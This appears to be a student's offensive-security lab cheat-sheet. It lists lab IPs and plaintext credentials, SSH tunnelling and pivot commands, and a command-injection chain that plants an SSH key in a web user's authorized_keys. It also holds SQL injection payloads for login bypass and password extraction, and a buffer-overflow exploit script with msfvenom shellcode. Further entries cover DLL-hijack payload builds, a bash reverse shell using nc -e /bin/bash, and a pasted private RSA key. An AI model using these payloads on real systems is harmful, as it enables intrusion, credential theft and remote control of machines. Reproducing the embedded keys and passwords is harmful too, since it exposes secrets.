http://10.50.20.250:8000/          TYFI-006-M  Ja7Gh0bmQhGeAWq
10.50.28.181  Semper
GREYHOST:     10.50.35.7                                                                           student     Ja7Gh0bmQhGeAWq
ACCESSING GREYHOST:
  ssh -X student@10.50.35.7                                                                        Ja7Gh0bmQhGeAWq
  ssh -MS /tmp/grey student@10.50.35.7                                                             Ja7Gh0bmQhGeAWq

#CREDENTIALS
  WINDOWS:    xfreerdp /u:student /v:10.50.42.187 -dynamic-resolution +glyph-cache +clipboard      password
  LINUX:      ssh -X student@10.50.29.84                                                           Charity@2006
  GREYHOST:                                                                                   Student     Long Pass
  
REBUILD BOXES:
  VTA
  INSTANCES
  REBUILD INSTANCE
  SELECT IMAGE: NIX_OPS
  PARTITIION: AUTOMATIC
  REBUILD INSTANCE
  

#NMAP SCRIPT COMMANDS
  /usr/share/nmap/scripts
  nmap --script <filename>|<category>|<directory>
  nmap --script-help "ftp-* and discovery"
  nmap --script-args <args>
  nmap --script-args-file <filename>
  nmap --script-help <filename>|<category>|<directory>
  nmap --script-trace
      http-enum.nse


#COMMANDS
  ssh -MS /tmp/grey student@10.50.35.7
  ssh -S /tmp/grey grey -O forward -D 9050
  for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
  proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.1,2,3,97,98,99,100,105,111,120,129,130,131 -p-
  ssh -S /tmp/grey grey -O forward -L 40700:192.168.28.111:80
  ssh -S /tmp/grey grey -O forward -L 40710:192.168.28.111:22                                                  #Sets a new master socket referencing the original master socket to access an additional box
  ssh -MS /tmp/billybobhost billybob@0.0.0.0 -p 40710
  ssh -S /tmp/billybobhost -O forward -D 9050
  ssh -S /tmp/grey grey -O cancel -L 40700:192.168.28.111:80                                                   #Closes out a tunnel
  proxychains nmap -v -sT -Pn -T4 --script http-enum.nse 192.168.28.111 -p 80
  



ssh-keygen -t rsa -b 4096                                                                                        #Generates public ssh key
; mkdir /var/www/.ssh
; ls /var/www/ssh
vim test.txt
cat id_rsa.pub            ##HIGHLIGHT ALL OF IT##
copy to test.txt and addd > /var/www/.ssh/authorized_keys to the end
; echo (cat test.txt and copy over file contents) in quotes
ssh -i id_rsa www-data@10.50.27.157




#SQL INJECTION
  ##COMMANDS
SELECT                    Extracts data from a database
UNION                     Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS
USE                       Selects the DB to use
UPDATE                    Updates data in a database
DELETE                    Deletes data from a database
INSERT INTO               Inserts new data into a database
CREATE DATABASE           Creates a new database
ALTER DATABASE            Modifies a database
CREATE TABLE              Creates a new table
ALTER TABLE               Modifies a table
DROP TABLE                Deletes a table
CREATE INDEX              Creates an index (search key)
DROP INDEX                Deletes an index

show databases;           shows databases
SELECT * FROM session.car shows all items within the car subtable of the session table
SELECT * FROM session.car UNION SELECT tireid,name,size,cost,1,2 FROM session.Tires;

shwo TABLES FROM information_schema
Select Table_schema,table_name,Column_name FROM information_schema.Column;
IMPORTANT:
  TABLES
  COLUMNS
  DATABASES/TABLE_SCHEMA

User = ' GySgt' or 1='1'
Pass = 'Pass' or 1='1'

php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'                               GOLDEN STATEMENT
Audi' UNION select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
Audi' UNION select 1,2,3 #
Audi' UNION select id,2,name,pass,5 FROM session.user #
http://10.50.38.117/uniondemo.php?Selection=2%20or%201=1;%20#
http://10.50.38.117/uniondemo.php?Selection=2%20 UNION select 1,2,3;#
http://10.50.38.117/uniondemo.php?Selection=2%20 UNION select table_schema,column_name,table_name FROM information_schema.columns;#
http://10.50.38.117/uniondemo.php?Selection=2%20%20UNION select type,color,name FROM session.car;#

http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20select%20last_name,password,email%20FROM%20sqlinjection.members;#
RAM' UNION select table_schema,column_name FROM information_schema.columns; #

UNION @@version
RAM' UNION select 1,@@version; #       GIVES SQL VERSION

http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20SELECT%20Table_schema,column_name,Table_name%20FROM%20information_schema.columns;%20#
http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20SELECT%201,comment,data%20FROM%20sqlinjection.share4%20WHERE%20id=1337;%20#

./func <<<$(./Desktop/Security/Linux/mybuff.py)        runs func and injects mybuff as the input

./func "YahWeh"                   Command Line Argument
Enter a string: 
./func <<<$(echo "YahWeh")        User Input
Enter a string: 


env - gdb ./func                  Starts gdb without environment variables
unset LINES(OR COLUMNS)           removes gdb environmental variables
gdb ./func
info functions
pdisass main

find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4    Searches starting after the heap to the end of the stack for a jump instruction pointing to the EIP

#PAYLOADS
  msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python










#BUFFEROVERFLOW SCRIPT

#!/usr/bin/python2.7



#OFFSET

buf = "A" * 62  #OFFSET

'''
0xf7f650cf -> \xcf\x50\xf6\xf7
0xf7f65343 -> \x43\x53\xf6\xf7
0xf7f65497 -> \x97\x54\xf6\xf7
0xf7f655cf -> \xcf\x55\xf6\xf7
'''
buf += "\x59\x3b\xde\xf7"  #EIP REGISTER - JMP ESP
#msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python
buf += "\x90" * 10
buf += b"\xba\xd3\xd9\xf0\xd0\xd9\xc7\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x0c\x31\x55\x12\x83\xc5\x04\x03\x86"
buf += b"\xd7\x12\x25\x42\xe3\x8a\x5f\xc0\x95\x42\x4d\x87"
buf += b"\xd0\x74\xe5\x68\x90\x12\xf6\x1e\x79\x81\x9f\xb0"  
buf += b"\x0c\xa6\x32\xa4\x06\x29\xb3\x34\x70\x4f\xd0\x5b"
buf += b"\xec\xe9\x7f\xc4\xf0\xa2\x2c\x83\x10\x81\x53"
print(buf)


#WINDOWS
  ##DLL SEARCH ORDER
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
    The directory the the Application was run from
    The directory specified in in the C+ function GetSystemDirectory()
    The directory specified in the C+ function GetWindowsDirectory()
    The current directory



msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\student\Desktop\whoami.txt' -f exe > 7z.exe
msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\student\Desktop\whoamiPutty.txt' -f dll > SSPICLI.DLL

nc -nlvp 15021
#!/bin/bash
 
echo "$(nc 10.50.29.84 15021 -e /bin/bash)"




LOGIN INJECTION
  USER/PASS: GySgt' or 1='1



MIIEpQIBAAKCAQEA4D9rl2HG/luNAMXxsI7HxZQOo0df8y+9dW10AI7wLhL+S+rTVZHQ8jTXQ+ukPCcLIfA8yzw6njk5kK+xQzADubAg+8/kfpBKb6FcwbICly9tpdoqcRrQsSc4SNR09en2AdQWT6pmaScpQXcptyjdMmb4BTLOwdI2/UhZIf/iadTsc6IV/PF3No/g5NVEZGNMWTk7zoGGnxY2xSDWnrlTKm/mHhMo/Y8cTRaOvReLHpa37RZmn+QLqUolvj/BozkXgK1gcRIL3C6rIZfoE7n/Ne48W9rXq81vH/6lStPV7HqTDz2eXpX1KksytTd2uLE7tftBLBgCxowf4kl23gpnAwIDAQABAoIBAQCeX4wQDOkqSOQrkKDiDeS/AJLZ9BWqvaOzpEqR/mFYWOeqHD2HKIWGGZWSjYCfTv/Ix09YRcAscMPcEIlDp0xqPx78WNXKIQPBFRhaX+r+dWud/5eL6+FJzCYvIYU9DDBHGE9tki3jw9maN5uJlN2rtBckLL7jGiDl/sucfIieLoSSvqazEaNniVQu9kri6y8hWGFQyFCmIJBgDNbU94XRNfyMjMOMbNSzHdB16ndXixQ97mok8MMaZ46Jmm7Uh4xY/fSVSyWyRjr8e8aXyOt7GZhKSgVOqEpy9LlY+JLSsGKtZcW10F1IaHvf8GKlx6171xl1kS2M5gKU8N5q2TUhAoGBAP3tsL/ljXZJcvml9eA1cgpEpnFg5fdxw4fL8g4Vh5GSj/nnaNhvVg/rVq8vbwPJE01cPdpXxKe/OoGVpyAy9E12ryHPUwwf38RkK7QllU7XZApuloMkhEFj6aQQUK0gMP/rtw5KB75RpnDEZQjUcPu2GwcOFtCaHPu3pQ6BpLpRAoGBAOITvnRizDh+pQyWxfulsnFfYdf9OIZ2njHcIg0/ez9E2zHwcrpjpLw6RElZ0S9rZwsvPNLcNt0HtXhyVFfWoihpH7FR+YWhyxHYHcjdU46GenfnsKO0rjp/ruEx6u05AhRlvnRizDh+pQyWxfulsnFfYdf9OIZ2njHcIg0/ez9E2zHwcrpjpLw6RElZ0S9rZwsvPNLcNt0HtXhyVFfWoihpH7FR+YWhyxHYHcjdU46GenfnsKO0rjp/ruEx6u05AhRl9JQNxi/Z0q3zE8HxzM0QQsgG0L6FX86MOOaOf6MTAoGAbQHqzJZY4hyp1O4f3T5UVIAgC7ATSOR3kgZFRTKM3jtSv29OHQu+oFrg/ZeZSsC5Ho6opuDitThsf1ClTDdTlSWMDTGZby0HvKFb+ZvgutXQRoIu7uFwPToNBLdUSt306whfryysolEe6G4HCYFZd1U3yRGNTcO7CXxOySlyc+ECgYEA177bzBnUpj1FqQPhoEr6RXMu3n5KiRd91DstS9M+/JvrSncaJYGd3fsE27MZC9XFGklUFC4PNVN7/Juunby4NzRLCF8gbkR+lGLX2a5NZQA0s2SpjzCH7E+ZRlLqzMPQlkLN6tRSQ6vtgA8u1bC5LyDLejP21TpWubfbPTrT130CgYEAmPSziwbA1SQjgmVIjkkKH+/pR6KFfV4q1apukhGz29M+b35UpPySVBLPYSS+BgJHlBdt9JVaIh/x0js4rWjo25XS/LbJ4lUCHdkAuSaGzTSaAM3wfPaVvmY0+I0N+fupndvL2bUWHR2Ftle+ZMHFSHgn2jLvkOfjful9XKjs2Ys=


ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgP2uXYcb+W40AxfGwjsfFlA6jR1/zL711bXQAjvAuEv5L6tNVkdDyNNdD66Q8Jwsh8DzLPDqeOTmQr7FDMAO5sCD7z+R+kEpvoVzBsgKXL22l2ipxGtCxJzhI1HT16fYB1BZPqmZpJylBdym3KN0yZvgFMs7B0jb9SFkh/+Jp1OxzohX88Xc2j+Dk1URkY0xZOTvOgYafFjbFINaeuVMqb+YeEyj9jxxNFo69F4selrftFmaf5AupSiW+P8GjOReArWBxEgvcLqshl+gTuf817jxb2terzW8f/qVK09XsepMPPZ5elfUqSzK1N3a4sTu1+0EsGALGjB/iSXbeCmcD comrade@extranet.site.donovia



find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files


